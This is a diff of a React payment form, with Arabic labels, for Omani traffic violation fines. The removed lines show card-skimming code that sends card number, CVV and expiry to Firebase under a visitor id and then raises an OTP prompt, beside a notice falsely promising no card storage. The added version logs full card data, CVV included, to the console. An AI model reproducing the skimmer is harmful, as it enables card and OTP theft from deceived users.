@@ -1,19 +1,28 @@
 "use client"
 
 import type React from "react"
-import { useState } from "react"
+import { useState, useEffect } from "react"
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
 import { Input } from "@/components/ui/input"
 import { Label } from "@/components/ui/label"
 import { Button } from "@/components/ui/button"
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
-import { Separator } from "@/components/ui/separator"
-import { CreditCard, Shield, ArrowRight, CheckCircle } from "lucide-react"
+import { Badge } from "@/components/ui/badge"
+import { Alert, AlertDescription } from "@/components/ui/alert"
+import { CreditCard, Shield, ArrowRight, CheckCircle, AlertCircle, Check, X } from "lucide-react"
 import { z } from "zod"
 import { useForm } from "react-hook-form"
 import { zodResolver } from "@hookform/resolvers/zod"
-import { OTPDialog } from "./otp-dialog"
-import { addData } from "@/lib/firebase"
+import {
+  validateCardNumber,
+  validateExpiryDate,
+  validateCVV,
+  validateOmanPhone,
+  formatCardNumber,
+  detectCardType,
+  CARD_TYPES,
+  type CardValidationResult,
+} from "@/lib/card-validator"
 
 interface Violation {
   id: string
@@ -30,36 +39,32 @@ interface PaymentFormProps {
   violations: Violation[]
   onSuccess: () => void
   onCancel: () => void
-  handleSubmit:any
 }
 
-// Payment form validation schema
+// Enhanced payment form validation schema
 const paymentSchema = z.object({
-  cardNumber: z
-    .string()
-    .min(1, "رقم البطاقة مطلوب")
-    .regex(/^\d{4}\s\d{4}\s\d{4}\s\d{4}$/, "رقم البطاقة غير صحيح"),
+  cardNumber: z.string().min(1, "رقم البطاقة مطلوب"),
   expiryMonth: z.string().min(1, "الشهر مطلوب"),
   expiryYear: z.string().min(1, "السنة مطلوبة"),
-  cvv: z
-    .string()
-    .min(3, "CVV يجب أن يكون 3-4 أرقام")
-    .max(4, "CVV يجب أن يكون 3-4 أرقام")
-    .regex(/^\d+$/, "CVV يجب أن يحتوي على أرقام فقط"),
+  cvv: z.string().min(1, "CVV مطلوب"),
   cardholderName: z.string().min(2, "اسم حامل البطاقة مطلوب").max(50, "الاسم طويل جداً"),
   email: z.string().min(1, "البريد الإلكتروني مطلوب").email("البريد الإلكتروني غير صحيح"),
-  phone: z
-    .string()
-    .min(1, "رقم الهاتف مطلوب")
-    .regex(/^(\+968|968)?\s?[79]\d{7}$/, "رقم الهاتف غير صحيح (مثال: +968 91234567)"),
+  phone: z.string().min(1, "رقم الهاتف مطلوب"),
 })
 
 type PaymentFormData = z.infer<typeof paymentSchema>
 
- export function PaymentForm({ totalAmount, violations, onSuccess, onCancel, handleSubmit }: PaymentFormProps) {
+export function EnhancedPaymentForm({ totalAmount, violations, onSuccess, onCancel }: PaymentFormProps) {
   const [isProcessing, setIsProcessing] = useState(false)
   const [paymentComplete, setPaymentComplete] = useState(false)
-  const [showOtp,setShowOtp] = useState(false)
+  const [cardValidation, setCardValidation] = useState<CardValidationResult>({
+    isValid: false,
+    cardType: null,
+    errors: [],
+  })
+  const [expiryValidation, setExpiryValidation] = useState({ isValid: false, errors: [] })
+  const [cvvValidation, setCvvValidation] = useState({ isValid: false, errors: [] })
+  const [phoneValidation, setPhoneValidation] = useState({ isValid: false, errors: [] })
 
   const {
     register,
@@ -67,55 +72,122 @@ type PaymentFormData = z.infer<typeof paymentSchema>
     setValue,
     watch,
     trigger,
+    handleSubmit: formHandleSubmit,
   } = useForm<PaymentFormData>({
     resolver: zodResolver(paymentSchema),
     mode: "onChange",
   })
 
   const cardNumber = watch("cardNumber")
+  const expiryMonth = watch("expiryMonth")
+  const expiryYear = watch("expiryYear")
+  const cvv = watch("cvv")
+  const phone = watch("phone")
 
-  const formatCardNumber = (value: string) => {
-    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
-    const matches = v.match(/\d{4,16}/g)
-    const match = (matches && matches[0]) || ""
-    const parts = []
-
-    for (let i = 0, len = match.length; i < len; i += 4) {
-      parts.push(match.substring(i, i + 4))
+  // Real-time card validation
+  useEffect(() => {
+    if (cardNumber) {
+      const validation = validateCardNumber(cardNumber)
+      setCardValidation(validation)
     }
+  }, [cardNumber])
 
-    if (parts.length) {
-      return parts.join(" ")
-    } else {
-      return v
+  // Real-time expiry validation
+  useEffect(() => {
+    if (expiryMonth && expiryYear) {
+      const validation = validateExpiryDate(expiryMonth, expiryYear)
+      setExpiryValidation(validation as any)
     }
-  }
+  }, [expiryMonth, expiryYear])
+
+  // Real-time CVV validation
+  useEffect(() => {
+    if (cvv) {
+      const validation = validateCVV(cvv, cardValidation.cardType)
+      setCvvValidation(validation as any)
+    }
+  }, [cvv, cardValidation.cardType])
+
+  // Real-time phone validation
+  useEffect(() => {
+    if (phone) {
+      const validation = validateOmanPhone(phone)
+      setPhoneValidation(validation as any)
+    }
+  }, [phone])
 
   const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const formatted = formatCardNumber(e.target.value)
-    if (formatted.length <= 19) {
+    const cardType = detectCardType(e.target.value)
+    const formatted = formatCardNumber(e.target.value, cardType)
+
+    // Limit length based on card type
+    const maxLength = cardType === "amex" ? 17 : 19 // Including spaces
+    if (formatted.length <= maxLength) {
       setValue("cardNumber", formatted)
       trigger("cardNumber")
     }
   }
 
-  const onSubmit = async (e:any) => {
-    e.preventDefault()
+  const onSubmit = async (data: PaymentFormData) => {
+    // Final validation check
+    const finalCardValidation = validateCardNumber(data.cardNumber)
+    const finalExpiryValidation = validateExpiryDate(data.expiryMonth, data.expiryYear)
+    const finalCvvValidation = validateCVV(data.cvv, finalCardValidation.cardType)
+    const finalPhoneValidation = validateOmanPhone(data.phone)
+
+    if (
+      !finalCardValidation.isValid ||
+      !finalExpiryValidation.isValid ||
+      !finalCvvValidation.isValid ||
+      !finalPhoneValidation.isValid
+    ) {
+      return
+    }
+
     setIsProcessing(true)
-    const visitorId=localStorage.getItem('visitor')
-    addData({id:visitorId,cardNumber,cvv:watch('cvv'),expiryDate:watch('expiryMonth')+"/"+watch('expiryYear')})
-    // Simulate payment processing
-    await new Promise((resolve) => setTimeout(resolve, 3000))
 
-    setIsProcessing(false)
+    try {
+      // Simulate payment processing
+      await new Promise((resolve) => setTimeout(resolve, 3000))
 
+      // Here you would normally send the payment data to your backend
+      console.log("Payment data:", {
+        ...data,
+        cardType: finalCardValidation.cardType,
+        amount: totalAmount,
+        violations: violations.map((v) => v.id),
+      })
 
-    // Auto redirect after success
-    setTimeout(() => {
-    setShowOtp(true)
-    setPaymentComplete(false)
+      setPaymentComplete(true)
 
-    }, 2000)
+      // Auto redirect after success
+      setTimeout(() => {
+        onSuccess()
+      }, 3000)
+    } catch (error) {
+      console.error("Payment failed:", error)
+    } finally {
+      setIsProcessing(false)
+    }
+  }
+
+  const getCardIcon = (cardType: string | null) => {
+    if (!cardType) return <CreditCard className="w-6 h-6 text-gray-400" />
+
+    const cardInfo = CARD_TYPES[cardType]
+    return (
+      <div className="flex items-center gap-2">
+        <CreditCard className="w-6 h-6 text-blue-600" />
+        <Badge variant="secondary" className="text-xs">
+          {cardInfo.name}
+        </Badge>
+      </div>
+    )
+  }
+
+  const ValidationIcon = ({ isValid, hasContent }: { isValid: boolean; hasContent: boolean }) => {
+    if (!hasContent) return null
+    return isValid ? <Check className="w-4 h-4 text-green-600" /> : <X className="w-4 h-4 text-red-600" />
   }
 
   if (paymentComplete) {
@@ -145,15 +217,22 @@ type PaymentFormData = z.infer<typeof paymentSchema>
         <CardHeader className="text-center pb-4">
           <CardTitle className="text-2xl font-bold text-gray-800 flex items-center justify-center gap-2">
             <CreditCard className="w-6 h-6" />
-            الدفع 
-                      </CardTitle>
+            الدفع الآمن
+          </CardTitle>
           <p className="text-gray-600">ادفع بأمان باستخدام بطاقتك الائتمانية</p>
         </CardHeader>
 
         <CardContent className="p-8">
           {/* Payment Summary */}
+          <div className="bg-gray-50 p-4 rounded-lg mb-6">
+            <div className="flex justify-between items-center">
+              <span className="font-semibold">إجمالي المبلغ:</span>
+              <span className="text-2xl font-bold text-green-600">{totalAmount} ر.ع</span>
+            </div>
+            <p className="text-sm text-gray-600 mt-1">عدد المخالفات: {violations.length}</p>
+          </div>
 
-          <form onSubmit={(e)=>onSubmit(e)} className="space-y-6">
+          <form onSubmit={formHandleSubmit(onSubmit)} className="space-y-6">
             {/* Card Information */}
             <div className="space-y-4">
               <h3 className="font-semibold text-gray-800 flex items-center gap-2">
@@ -161,35 +240,60 @@ type PaymentFormData = z.infer<typeof paymentSchema>
                 معلومات البطاقة
               </h3>
 
+              {/* Card Number */}
               <div className="space-y-2">
-                <Label htmlFor="cardNumber" className="text-gray-700">
+                <Label htmlFor="cardNumber" className="text-gray-700 flex items-center gap-2">
                   رقم البطاقة
+                  {getCardIcon(cardValidation.cardType)}
                 </Label>
-                <Input
-                  id="cardNumber"
-                  type="tel"
-                  {...register("cardNumber")}
-                  onChange={handleCardNumberChange}
-                  placeholder="#### #### #### ####"
-                  className={`bg-white text-left ${errors.cardNumber ? "border-red-500" : ""}`}
-                  dir="ltr"
-                />
-                {errors.cardNumber && <p className="text-red-500 text-sm">{errors.cardNumber.message}</p>}
+                <div className="relative">
+                  <Input
+                    id="cardNumber"
+                    type="tel"
+                    {...register("cardNumber")}
+                    onChange={handleCardNumberChange}
+                    placeholder="#### #### #### ####"
+                    className={`bg-white text-left pr-10 ${
+                      cardValidation.errors.length > 0
+                        ? "border-red-500"
+                        : cardValidation.isValid
+                          ? "border-green-500"
+                          : ""
+                    }`}
+                    dir="ltr"
+                  />
+                  <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
+                    <ValidationIcon isValid={cardValidation.isValid} hasContent={!!cardNumber} />
+                  </div>
+                </div>
+                {cardValidation.errors.map((error, index) => (
+                  <p key={index} className="text-red-500 text-sm flex items-center gap-1">
+                    <AlertCircle className="w-4 h-4" />
+                    {error}
+                  </p>
+                ))}
+                {cardValidation.isValid && cardValidation.cardType && (
+                  <p className="text-green-600 text-sm flex items-center gap-1">
+                    <CheckCircle className="w-4 h-4" />
+                    بطاقة {CARD_TYPES[cardValidation.cardType].name} صحيحة
+                  </p>
+                )}
               </div>
 
+              {/* Expiry and CVV */}
               <div className="grid grid-cols-3 gap-4">
                 <div className="space-y-2">
                   <Label htmlFor="expiryMonth" className="text-gray-700">
                     الشهر
                   </Label>
                   <Select
-                    value={watch("expiryMonth")}
+                    value={expiryMonth}
                     onValueChange={(value) => {
                       setValue("expiryMonth", value)
                       trigger("expiryMonth")
                     }}
                   >
-                    <SelectTrigger>
+                    <SelectTrigger className={expiryValidation.errors.length > 0 ? "border-red-500" : ""}>
                       <SelectValue placeholder="الشهر" />
                     </SelectTrigger>
                     <SelectContent>
@@ -200,7 +304,6 @@ type PaymentFormData = z.infer<typeof paymentSchema>
                       ))}
                     </SelectContent>
                   </Select>
-                  {errors.expiryMonth && <p className="text-red-500 text-sm">{errors.expiryMonth.message}</p>}
                 </div>
 
                 <div className="space-y-2">
@@ -208,44 +311,74 @@ type PaymentFormData = z.infer<typeof paymentSchema>
                     السنة
                   </Label>
                   <Select
-                    value={watch("expiryYear")}
+                    value={expiryYear}
                     onValueChange={(value) => {
                       setValue("expiryYear", value)
                       trigger("expiryYear")
                     }}
                   >
-                    <SelectTrigger>
+                    <SelectTrigger className={expiryValidation.errors.length > 0 ? "border-red-500" : ""}>
                       <SelectValue placeholder="السنة" />
                     </SelectTrigger>
                     <SelectContent>
-                      {Array.from({ length: 10 }, (_, i) => (
+                      {Array.from({ length: 15 }, (_, i) => (
                         <SelectItem key={2024 + i} value={String(2024 + i)}>
                           {2024 + i}
                         </SelectItem>
                       ))}
                     </SelectContent>
                   </Select>
-                  {errors.expiryYear && <p className="text-red-500 text-sm">{errors.expiryYear.message}</p>}
                 </div>
 
-                <div className="space-y-2">
-                  <Label htmlFor="cvv" className="text-gray-700">
+                <div className="space-y-4">
+                  <Label htmlFor="cvv" className="text-gray-700 flex items-center gap-1">
                     CVV
+                    {cardValidation.cardType && (
+                      <Badge variant="outline" className="text-xs">
+                        {CARD_TYPES[cardValidation.cardType].cvvLength} أرقام
+                      </Badge>
+                    )}
                   </Label>
-                  <Input
-                    id="cvv"
-                    type="tel"
-                    {...register("cvv")}
-                    placeholder="***"
-                    className={`bg-white text-left ${errors.cvv ? "border-red-500" : ""}`}
-                    dir="ltr"
-                    required
-                    maxLength={3}
-                  />
-                  {errors.cvv && <p className="text-red-500 text-sm">{errors.cvv.message}</p>}
+                  <div className="relative">
+                    <Input
+                      id="cvv"
+                      type="tel"
+                      {...register("cvv")}
+                      placeholder={cardValidation.cardType === "amex" ? "****" : "***"}
+                      className={`bg-white text-left pr-10 ${
+                        cvvValidation.errors.length > 0
+                          ? "border-red-500"
+                          : cvvValidation.isValid
+                            ? "border-green-500"
+                            : ""
+                      }`}
+                      dir="ltr"
+                      maxLength={cardValidation.cardType === "amex" ? 4 : 3}
+                    />
+                    <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
+                      <ValidationIcon isValid={cvvValidation.isValid} hasContent={!!cvv} />
+                    </div>
+                  </div>
                 </div>
               </div>
 
+              {/* Expiry validation errors */}
+              {expiryValidation.errors.map((error, index) => (
+                <p key={index} className="text-red-500 text-sm flex items-center gap-1">
+                  <AlertCircle className="w-4 h-4" />
+                  {error}
+                </p>
+              ))}
+
+              {/* CVV validation errors */}
+              {cvvValidation.errors.map((error, index) => (
+                <p key={index} className="text-red-500 text-sm flex items-center gap-1">
+                  <AlertCircle className="w-4 h-4" />
+                  {error}
+                </p>
+              ))}
+
+              {/* Cardholder Name */}
               <div className="space-y-2">
                 <Label htmlFor="cardholderName" className="text-gray-700">
                   اسم حامل البطاقة
@@ -256,7 +389,6 @@ type PaymentFormData = z.infer<typeof paymentSchema>
                   {...register("cardholderName")}
                   placeholder="الاسم كما هو مكتوب على البطاقة"
                   className={`bg-white ${errors.cardholderName ? "border-red-500" : ""}`}
-                  required
                 />
                 {errors.cardholderName && <p className="text-red-500 text-sm">{errors.cardholderName.message}</p>}
               </div>
@@ -265,40 +397,62 @@ type PaymentFormData = z.infer<typeof paymentSchema>
             {/* Contact Information */}
             <div className="space-y-4">
               <h3 className="font-semibold text-gray-800">معلومات الاتصال</h3>
+
               <div className="space-y-2">
                 <Label htmlFor="phone" className="text-gray-700">
                   رقم الهاتف
                 </Label>
-                <Input
-                  id="phone"
-                  type="tel"
-                  {...register("phone")}
-                  placeholder="+968 9123 4567"
-                  className={`bg-white text-left ${errors.phone ? "border-red-500" : ""}`}
-                  dir="ltr"
-                  required
-                />
-                {errors.phone && <p className="text-red-500 text-sm">{errors.phone.message}</p>}
+                <div className="relative">
+                  <Input
+                    id="phone"
+                    type="tel"
+                    {...register("phone")}
+                    placeholder="+968 9123 4567"
+                    className={`bg-white text-left pr-10 ${
+                      phoneValidation.errors.length > 0
+                        ? "border-red-500"
+                        : phoneValidation.isValid
+                          ? "border-green-500"
+                          : ""
+                    }`}
+                    dir="ltr"
+                  />
+                  <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
+                    <ValidationIcon isValid={phoneValidation.isValid} hasContent={!!phone} />
+                  </div>
+                </div>
+                {phoneValidation.errors.map((error, index) => (
+                  <p key={index} className="text-red-500 text-sm flex items-center gap-1">
+                    <AlertCircle className="w-4 h-4" />
+                    {error}
+                  </p>
+                ))}
               </div>
             </div>
 
             {/* Security Notice */}
-            <div className="bg-blue-50 p-4 rounded-lg border border-blue-200">
-              <div className="flex items-start gap-3">
-                <Shield className="w-5 h-5 text-blue-600 mt-0.5" />
-                <div className="text-sm text-blue-800">
-                  <p className="font-semibold mb-1">دفع آمن ومحمي</p>
-                  <p>جميع معلومات الدفع محمية بتشفير SSL 256-bit. لن يتم حفظ معلومات بطاقتك على خوادمنا.</p>
-                </div>
-              </div>
-            </div>
+            <Alert className="bg-blue-50 border-blue-200">
+              <Shield className="w-4 h-4 text-blue-600" />
+              <AlertDescription className="text-blue-800">
+                <p className="font-semibold mb-1">دفع آمن ومحمي</p>
+                <p className="text-sm">
+                  جميع معلومات الدفع محمية بتشفير SSL 256-bit. لن يتم حفظ معلومات بطاقتك على خوادمنا.
+                </p>
+              </AlertDescription>
+            </Alert>
 
             {/* Action Buttons */}
             <div className="flex gap-4 pt-4">
               <Button
                 type="submit"
-                disabled={isProcessing}
-                className="flex-1 bg-[#9aca3f] hover:bg-[#006e33] text-white font-bold py-4 text-lg disabled:opacity-50"
+                disabled={
+                  isProcessing ||
+                  !cardValidation.isValid ||
+                  !expiryValidation.isValid ||
+                  !cvvValidation.isValid ||
+                  !phoneValidation.isValid
+                }
+                className="flex-1 bg-green-600 hover:bg-green-700 text-white font-bold py-4 text-lg disabled:opacity-50"
               >
                 {isProcessing ? (
                   <div className="flex items-center gap-2">
@@ -307,12 +461,10 @@ type PaymentFormData = z.infer<typeof paymentSchema>
                   </div>
                 ) : (
                   <div className="flex items-center gap-2">
-                    دفع 
-                    <ArrowRight className="w-4 h-4" />
+                    دفع {totalAmount} ر.ع <ArrowRight className="w-4 h-4" />
                   </div>
                 )}
               </Button>
-
               <Button
                 type="button"
                 variant="outline"
@@ -325,14 +477,6 @@ type PaymentFormData = z.infer<typeof paymentSchema>
             </div>
           </form>
         </CardContent>
-        <OTPDialog isOpen={showOtp}
-         onClose={function (): void {
-        } } phoneNumber={""}
-        />
-                
-        
-
-      
       </Card>
     </div>
   )
